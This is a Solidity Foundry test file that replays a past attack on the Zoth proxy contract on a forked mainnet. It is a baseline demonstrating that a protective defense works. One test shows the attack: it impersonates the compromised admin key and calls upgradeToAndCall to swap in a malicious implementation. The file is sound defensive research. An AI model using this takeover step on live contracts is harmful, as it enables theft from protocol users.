// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";

/// @title ZothBaselineTest
/// @notice Baseline demonstration: against the UNMODIFIED Zoth contract on a
///         forked mainnet, the actual attacker transaction succeeds. This is
///         the counterfactual — what would have happened if Zoth had not used
///         our defense (i.e., what actually did happen at block 22094140).
///
///         Run side-by-side with ZothEtchTest to see the contrast:
///         - Baseline: attack succeeds, implementation swapped to malicious
///         - Protected: attack reverts, implementation unchanged
contract ZothBaselineTest is Test {
    uint256 internal constant FORK_BLOCK = 22094139;

    address internal constant ZOTH_PROXY = 0x82f3a0392F58C50fa90542519832471BaE93e43e;
    address internal constant ZOTH_IMPL_LEGIT = 0x7Cb771ca7b9ABcCCFdc19564E7260795cD51629E;
    address internal constant ZOTH_DEPLOYER = 0x3604582f56565d7060D73829FfB9EBD579218Dca;
    address internal constant ZOTH_MALICIOUS_IMPL = 0xc89d7894341e13d5067d003Af5346b257D861f56;

    bytes32 internal constant IMPL_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function setUp() public {
        // Fork mainnet at the block before the exploit.
        // Note: NO etching — Zoth's original contract is what runs here.
        string memory rpcUrl = vm.envString("ALCHEMY_MAINNET_URL");
        vm.createSelectFork(rpcUrl, FORK_BLOCK);
    }

    /// Sanity: verify we're testing against Zoth's actual deployed code.
    function test_Baseline_ImplIsZothOriginal() public view {
        bytes32 currentImpl = vm.load(ZOTH_PROXY, IMPL_SLOT);
        address impl = address(uint160(uint256(currentImpl)));
        assertEq(impl, ZOTH_IMPL_LEGIT, "running against unmodified Zoth contract");
    }

    /// THE KEY BASELINE TEST: run the actual attacker transaction against
    /// the unmodified Zoth contract. It should succeed, because Zoth's
    /// _authorizeUpgrade only checks ADMIN_ROLE, and the attacker has it.
    /// 
    /// This is the counterfactual that demonstrates the attack works without
    /// our defense.
    function test_Baseline_ZothAttackSucceeds() public {
        // Snapshot pre-attack state
        bytes32 implBefore = vm.load(ZOTH_PROXY, IMPL_SLOT);
        address implAddrBefore = address(uint160(uint256(implBefore)));
        console2.log("Implementation BEFORE attack:", implAddrBefore);

        // Execute the actual attacker transaction.
        // upgradeToAndCall is the standard UUPS function inherited by Zoth.
        // We call it on the proxy.
        bytes memory upgradeCalldata = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            ZOTH_MALICIOUS_IMPL,
            ""
        );

        vm.prank(ZOTH_DEPLOYER);
        (bool success, ) = ZOTH_PROXY.call(upgradeCalldata);

        // Verify attack SUCCEEDED.
        assertTrue(success, "attack succeeded against unprotected Zoth");

        // Implementation slot now points to the malicious contract.
        bytes32 implAfter = vm.load(ZOTH_PROXY, IMPL_SLOT);
        address implAddrAfter = address(uint160(uint256(implAfter)));
        console2.log("Implementation AFTER attack:", implAddrAfter);
        assertEq(
            implAddrAfter,
            ZOTH_MALICIOUS_IMPL,
            "implementation swapped to malicious"
        );

        // The proxy is now compromised. Any subsequent call to it will
        // delegate to the attacker's contract.
    }
    /// At fork block 22094139, the malicious implementation is ALREADY DEPLOYED.
    /// Etherscan records show it was deployed at block 22053625 (March 15, 2025),
    /// six days before the exploit. The attacker pre-staged the malicious
    /// contract — likely waiting for the right moment to use the compromised
    /// admin key.
    /// 
    /// This timeline matters for the threat model: our defense must work
    /// against attackers who have:
    ///   - Full admin key compromise
    ///   - Pre-deployed malicious infrastructure
    ///   - Days or weeks of preparation
    /// And it does.
    function test_Baseline_MaliciousImplPredeployed() public view {
        uint256 codeSize;
        address target = ZOTH_MALICIOUS_IMPL;
        assembly {
            codeSize := extcodesize(target)
        }
        assertGt(codeSize, 0, "malicious impl was pre-staged before fork block");
        console2.log(
            "Malicious impl bytecode size at block 22094139:",
            codeSize
        );
        console2.log(
            "(Pre-deployed at block 22053625, ~6 days before exploit)"
        );
    }
}